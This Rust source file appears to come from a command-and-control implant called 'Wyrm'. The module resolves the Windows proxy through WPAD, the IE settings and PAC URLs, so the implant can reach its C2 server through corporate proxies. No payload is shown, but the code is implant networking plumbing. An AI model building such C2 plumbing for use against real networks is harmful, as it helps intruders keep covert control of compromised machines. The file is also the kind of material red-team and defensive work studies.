use std::{ffi::c_void, iter::once, mem::zeroed, ptr::null_mut};

use windows_sys::Win32::{
    Foundation::{FALSE, GetLastError, GlobalFree, TRUE},
    Globalization::lstrlenW,
    Networking::WinHttp::{
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_AUTO_DETECT_TYPE_DHCP, WINHTTP_AUTO_DETECT_TYPE_DNS_A,
        WINHTTP_AUTOPROXY_AUTO_DETECT, WINHTTP_AUTOPROXY_CONFIG_URL, WINHTTP_AUTOPROXY_OPTIONS,
        WINHTTP_CURRENT_USER_IE_PROXY_CONFIG, WINHTTP_PROXY_INFO, WinHttpCloseHandle,
        WinHttpGetIEProxyConfigForCurrentUser, WinHttpGetProxyForUrl, WinHttpOpen,
    },
};

use crate::{comms::construct_c2_url, wyrm::Wyrm};

#[derive(Default)]
pub struct ProxyConfig {
    pub proxy_url: Option<String>,
    proxy_bypass: Option<String>,
}

pub enum ProxyError {
    /// The function could not convert UNICODE chars to a string in the lpszProxy field.
    DecodeStringErrorProxy,
    /// The function could not convert UNICODE chars to a string in the lpszProxyBypass field.
    DecodeStringErrorBypass,
    /// The function failed to get a valid pointer to a HINTERNET
    HInternetFailed,
    WinHttpProxyForUrlFailed(u32),
}

pub fn resolve_web_proxy(implant: &Wyrm) -> Result<Option<ProxyConfig>, ProxyError> {
    //
    //  Try resolve the proxy the simplest way through WinHttpGetProxyForUrl
    //

    println!("Resolving proxy..");

    let ua_wide: Vec<u16> = implant
        .c2_config
        .useragent
        .encode_utf16()
        .chain(once(0))
        .collect();

    let h_internet = unsafe {
        WinHttpOpen(
            ua_wide.as_ptr(),
            WINHTTP_ACCESS_TYPE_NO_PROXY,
            null_mut(),
            null_mut(),
            0,
        )
    };

    if h_internet.is_null() {
        #[cfg(debug_assertions)]
        {
            use shared::pretty_print::print_failed;

            print_failed("HINTERNET failed..");
        }
        return Err(ProxyError::HInternetFailed);
    }

    let c2 = construct_c2_url(implant);
    let target_is_https = c2.starts_with("https://");
    let url: Vec<u16> = c2.encode_utf16().chain(once(0)).collect();

    let mut auto_proxy_options: WINHTTP_AUTOPROXY_OPTIONS = unsafe { core::mem::zeroed() };
    auto_proxy_options.fAutoLogonIfChallenged = TRUE;
    auto_proxy_options.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
    auto_proxy_options.dwAutoDetectFlags =
        WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;

    let mut out_proxy_info = WINHTTP_PROXY_INFO::default();
    let result = unsafe {
        WinHttpGetProxyForUrl(
            h_internet,
            url.as_ptr(),
            &mut auto_proxy_options,
            &mut out_proxy_info,
        )
    };

    println!("Result of WinHttpGetProxyForUrl: {result}");

    if result == TRUE {
        // If we got a valid proxy URL..
        if !out_proxy_info.lpszProxy.is_null() {
            println!("GOT PROXY VALID URL");
            let len_proxy = unsafe { lstrlenW(out_proxy_info.lpszProxy) } as usize;
            if len_proxy > 0 {
                let slice =
                    unsafe { std::slice::from_raw_parts(out_proxy_info.lpszProxy, len_proxy) };
                let Ok(proxy_url) = String::from_utf16(slice) else {
                    unsafe { WinHttpCloseHandle(h_internet) };
                    global_free(out_proxy_info.lpszProxyBypass as *mut _);
                    global_free(out_proxy_info.lpszProxy as *mut _);
                    return Err(ProxyError::DecodeStringErrorProxy);
                };

                unsafe { WinHttpCloseHandle(h_internet) };
                global_free(out_proxy_info.lpszProxyBypass as *mut _);
                global_free(out_proxy_info.lpszProxy as *mut _);

                let proxy_url = winhttp_proxy_to_url(&proxy_url, target_is_https);

                println!("PROXY URL: {proxy_url:?}");
                return Ok(Some(ProxyConfig {
                    proxy_url: proxy_url,
                    proxy_bypass: None,
                }));
            }
        }
    }

    //
    // Try via next best options to resolve proxy
    //

    println!("TRYING NEXT... NON WPAD");
    let mut winhttp_proxy_config = WINHTTP_CURRENT_USER_IE_PROXY_CONFIG::default();
    let result = unsafe { WinHttpGetIEProxyConfigForCurrentUser(&mut winhttp_proxy_config) };

    println!("Result of WinHttpGetIEProxyConfigForCurrentUser: {result}");

    if result == TRUE {
        //
        // If an explicit proxy server is defined
        //
        if !winhttp_proxy_config.lpszProxy.is_null() {
            let mut proxy_config = ProxyConfig::default();

            let len_proxy = unsafe { lstrlenW(winhttp_proxy_config.lpszProxy) } as usize;
            let len_bypass = {
                if !winhttp_proxy_config.lpszProxyBypass.is_null() {
                    unsafe { lstrlenW(winhttp_proxy_config.lpszProxyBypass) }
                } else {
                    0
                }
            } as usize;

            if len_proxy > 0 {
                let slice = unsafe {
                    std::slice::from_raw_parts(winhttp_proxy_config.lpszProxy, len_proxy)
                };
                let Ok(proxy_url) = String::from_utf16(slice) else {
                    #[cfg(debug_assertions)]
                    {
                        use shared::pretty_print::print_failed;

                        print_failed(format!("BAD STRING SLICE. {slice:?}"));
                    }

                    unsafe { WinHttpCloseHandle(h_internet) };
                    global_free(winhttp_proxy_config.lpszProxyBypass as *mut _);
                    global_free(winhttp_proxy_config.lpszProxy as *mut _);
                    global_free(winhttp_proxy_config.lpszAutoConfigUrl as *mut _);
                    return Err(ProxyError::DecodeStringErrorProxy);
                };

                proxy_config.proxy_url = winhttp_proxy_to_url(&proxy_url, target_is_https);

                // Now try resolve the bypass UNICODE string
                if len_bypass > 0 {
                    let slice = unsafe {
                        std::slice::from_raw_parts(winhttp_proxy_config.lpszProxyBypass, len_bypass)
                    };

                    let Ok(bypass_url) = String::from_utf16(slice) else {
                        unsafe { WinHttpCloseHandle(h_internet) };
                        global_free(winhttp_proxy_config.lpszProxyBypass as *mut _);
                        global_free(winhttp_proxy_config.lpszProxy as *mut _);
                        global_free(winhttp_proxy_config.lpszAutoConfigUrl as *mut _);
                        return Err(ProxyError::DecodeStringErrorBypass);
                    };

                    proxy_config.proxy_bypass = Some(bypass_url);
                }

                global_free(winhttp_proxy_config.lpszProxyBypass as *mut _);
                global_free(winhttp_proxy_config.lpszProxy as *mut _);
                global_free(winhttp_proxy_config.lpszAutoConfigUrl as *mut _);
                unsafe { WinHttpCloseHandle(h_internet) };

                println!("GOT PROXY FROM 2nd branch: {:?}", proxy_config.proxy_url);
                return Ok(Some(proxy_config));
            }
        }

        // Otherwise.. fall through
    }

    //
    // Check for auto proxy
    //
    if !winhttp_proxy_config.lpszAutoConfigUrl.is_null() {
        println!("IN AUTO PROXY CHECKER");
        auto_proxy_options.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL;
        auto_proxy_options.lpszAutoConfigUrl = winhttp_proxy_config.lpszAutoConfigUrl;
        auto_proxy_options.dwAutoDetectFlags = 0;

        // reset out data so we dont read partially cached fields from earlier call
        let mut out_proxy_info = unsafe { zeroed() };

        let result = unsafe {
            WinHttpGetProxyForUrl(
                h_internet,
                url.as_ptr(),
                &mut auto_proxy_options,
                &mut out_proxy_info,
            )
        };

        if result == TRUE && !out_proxy_info.lpszProxy.is_null() {
            let len_proxy = unsafe { lstrlenW(out_proxy_info.lpszProxy) } as usize;
            if len_proxy > 0 {
                let slice =
                    unsafe { std::slice::from_raw_parts(out_proxy_info.lpszProxy, len_proxy) };
                let Ok(proxy_url) = String::from_utf16(slice) else {
                    unsafe { WinHttpCloseHandle(h_internet) };
                    global_free(out_proxy_info.lpszProxyBypass as *mut _);
                    global_free(out_proxy_info.lpszProxy as *mut _);
                    return Err(ProxyError::DecodeStringErrorProxy);
                };

                unsafe { WinHttpCloseHandle(h_internet) };
                global_free(out_proxy_info.lpszProxyBypass as *mut _);
                global_free(out_proxy_info.lpszProxy as *mut _);

                let proxy_url = winhttp_proxy_to_url(&proxy_url, target_is_https);
                println!("WITH URL: {proxy_url:?}");
                return Ok(Some(ProxyConfig {
                    proxy_url: proxy_url,
                    proxy_bypass: None,
                }));
            }
        }
    }

    println!("ALL FAILED");

    unsafe { WinHttpCloseHandle(h_internet) };
    global_free(out_proxy_info.lpszProxyBypass as *mut _);
    global_free(out_proxy_info.lpszProxy as *mut _);
    global_free(winhttp_proxy_config.lpszProxyBypass as *mut _);
    global_free(winhttp_proxy_config.lpszProxy as *mut _);
    global_free(winhttp_proxy_config.lpszAutoConfigUrl as *mut _);
    Ok(None)
}

fn global_free(p: *mut c_void) {
    if !p.is_null() {
        unsafe { GlobalFree(p) };
    }
}

fn winhttp_proxy_to_url(raw: &str, target_is_https: bool) -> Option<String> {
    let raw = raw.trim().trim_matches('"');
    if raw.is_empty() {
        return None;
    }
    if raw.eq_ignore_ascii_case("DIRECT") {
        return None;
    }

    let mut chosen = None;
    if raw.contains("http=") || raw.contains("https=") || raw.contains("socks=") {
        for part in raw.split(';').map(str::trim).filter(|p| !p.is_empty()) {
            if let Some((k, v)) = part.split_once('=') {
                let k = k.trim().to_ascii_lowercase();
                let v = v.trim();
                if target_is_https && k == "https" {
                    chosen = Some(v);
                    break;
                }
                if !target_is_https && k == "http" {
                    chosen = Some(v);
                    break;
                }
                // fallback
                if chosen.is_none() && (k == "http" || k == "https") {
                    chosen = Some(v);
                }
            }
        }
    }

    let list = chosen.unwrap_or(raw);

    let first = list
        .split(';')
        .map(str::trim)
        .find(|p| !p.is_empty() && !p.eq_ignore_ascii_case("DIRECT"))?;

    if first.contains("://") {
        return Some(first.to_string());
    }

    Some(format!("http://{first}"))
}
